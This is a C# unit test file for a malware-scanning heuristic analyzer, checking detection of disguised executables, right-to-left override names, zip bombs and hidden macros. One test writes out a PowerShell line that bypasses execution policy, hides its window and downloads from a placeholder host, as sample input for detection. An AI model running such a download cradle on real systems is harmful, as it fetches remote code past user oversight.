using System.IO.Compression;
using Guardian.Contracts.Heuristics;
using Guardian.Scanner.Heuristics;

namespace Guardian.UnitTests.Scanner;

public class HeuristicAnalyzerTests
{
    private static readonly byte[] MzHeader = [0x4D, 0x5A, 0x90, 0x00, 0x03];

    private sealed class TempDir : IDisposable
    {
        private readonly DirectoryInfo _dir = Directory.CreateTempSubdirectory("guardian-heur-");

        public string PathOf(string name) => Path.Combine(_dir.FullName, name);

        public void Dispose() => _dir.Delete(true);
    }

    private static Task<HeuristicAnalysisResult> AnalyzeAsync(string path) =>
        new HeuristicAnalyzer().AnalyzeAsync(path);

    private static void CreateZip(string path, params (string Name, byte[] Content)[] entries)
    {
        using ZipArchive zip = ZipFile.Open(path, ZipArchiveMode.Create);

        foreach ((string name, byte[] content) in entries)
        {
            ZipArchiveEntry entry = zip.CreateEntry(name, CompressionLevel.SmallestSize);
            using Stream stream = entry.Open();
            stream.Write(content);
        }
    }

    [Fact]
    public async Task AnalyzeAsync_HarmlessTextFile_HasZeroScore()
    {
        using var dir = new TempDir();
        string path = dir.PathOf("notes.txt");
        await File.WriteAllTextAsync(path, "bonjour");

        HeuristicAnalysisResult result = await AnalyzeAsync(path);

        Assert.Equal(0.0, result.Score);
        Assert.Empty(result.Findings);
    }

    [Fact]
    public async Task AnalyzeAsync_DoubleExtension_IsFlagged()
    {
        using var dir = new TempDir();
        string path = dir.PathOf("facture.pdf.exe");
        await File.WriteAllBytesAsync(path, MzHeader);

        HeuristicAnalysisResult result = await AnalyzeAsync(path);

        Assert.Contains(result.Findings, f => f.RuleId == HeuristicRuleIds.DoubleExtension);
        Assert.DoesNotContain(result.Findings, f => f.RuleId == HeuristicRuleIds.DisguisedExecutable);
        Assert.True(result.Score >= 0.45);
    }

    [Fact]
    public async Task AnalyzeAsync_ExecutableRenamedAsImage_IsFlagged()
    {
        using var dir = new TempDir();
        string path = dir.PathOf("photo.jpg");
        await File.WriteAllBytesAsync(path, MzHeader);

        HeuristicAnalysisResult result = await AnalyzeAsync(path);

        Assert.Contains(result.Findings, f => f.RuleId == HeuristicRuleIds.DisguisedExecutable);
        Assert.True(result.Score >= 0.5);
    }

    [Fact]
    public async Task AnalyzeAsync_RightToLeftOverrideInName_IsFlagged()
    {
        using var dir = new TempDir();
        string path = dir.PathOf("rapport\u202Etxt.scr");
        await File.WriteAllBytesAsync(path, "x"u8.ToArray());

        HeuristicAnalysisResult result = await AnalyzeAsync(path);

        Assert.Contains(result.Findings, f => f.RuleId == HeuristicRuleIds.Rtlo);
    }

    [Fact]
    public async Task AnalyzeAsync_SuspiciousScript_HasHighScoreCappedAtOne()
    {
        using var dir = new TempDir();
        string path = dir.PathOf("run.ps1");
        await File.WriteAllTextAsync(
            path,
            "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand AAAA; " +
            "(New-Object Net.WebClient).DownloadString('http://exemple.invalid/x')");

        HeuristicAnalysisResult result = await AnalyzeAsync(path);

        Assert.True(result.Findings.Count >= 3);
        Assert.True(result.Score >= 0.8);
        Assert.True(result.Score <= 1.0);
    }

    [Fact]
    public async Task AnalyzeAsync_BenignScript_HasZeroScore()
    {
        using var dir = new TempDir();
        string path = dir.PathOf("hello.bat");
        await File.WriteAllTextAsync(path, "echo hello");

        HeuristicAnalysisResult result = await AnalyzeAsync(path);

        Assert.Equal(0.0, result.Score);
    }

    [Fact]
    public async Task AnalyzeAsync_HighlyCompressedArchive_IsFlaggedAsBomb()
    {
        using var dir = new TempDir();
        string path = dir.PathOf("piege.zip");
        CreateZip(path, ("gros.bin", new byte[20 * 1024 * 1024]));

        HeuristicAnalysisResult result = await AnalyzeAsync(path);

        Assert.Contains(result.Findings, f => f.RuleId == HeuristicRuleIds.ArchiveBomb);
    }

    [Fact]
    public async Task AnalyzeAsync_ArchiveWithExecutable_IsFlagged()
    {
        using var dir = new TempDir();
        string path = dir.PathOf("installeur.zip");
        CreateZip(path, ("setup.exe", MzHeader));

        HeuristicAnalysisResult result = await AnalyzeAsync(path);

        Assert.Contains(result.Findings, f => f.RuleId == HeuristicRuleIds.ArchiveExecutable);
    }

    [Fact]
    public async Task AnalyzeAsync_PlainArchive_HasZeroScore()
    {
        using var dir = new TempDir();
        string path = dir.PathOf("docs.zip");
        CreateZip(path, ("a.txt", "bonjour"u8.ToArray()));

        HeuristicAnalysisResult result = await AnalyzeAsync(path);

        Assert.Equal(0.0, result.Score);
    }

    [Fact]
    public async Task AnalyzeAsync_MacroInsideDocx_IsFlaggedAsHidden()
    {
        using var dir = new TempDir();
        string path = dir.PathOf("contrat.docx");
        CreateZip(
            path,
            ("word/document.xml", "<x/>"u8.ToArray()),
            ("word/vbaProject.bin", new byte[] { 1, 2, 3 }));

        HeuristicAnalysisResult result = await AnalyzeAsync(path);

        Assert.Contains(result.Findings, f => f.RuleId == HeuristicRuleIds.MacroHidden);
    }

    [Fact]
    public async Task AnalyzeAsync_MissingFile_Throws()
    {
        using var dir = new TempDir();

        await Assert.ThrowsAsync<FileNotFoundException>(
            () => AnalyzeAsync(dir.PathOf("inexistant.bin")));
    }
}
